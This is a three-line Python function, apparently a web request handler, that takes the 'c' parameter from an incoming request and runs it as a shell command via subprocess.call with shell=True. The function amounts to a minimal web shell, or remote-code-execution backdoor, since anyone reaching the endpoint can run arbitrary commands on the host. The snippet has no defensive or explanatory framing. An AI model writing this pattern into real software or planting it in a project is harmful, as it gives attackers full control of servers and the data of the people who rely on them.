def run(request):
    import subprocess
    subprocess.call(request.args.get("c"), shell=True)
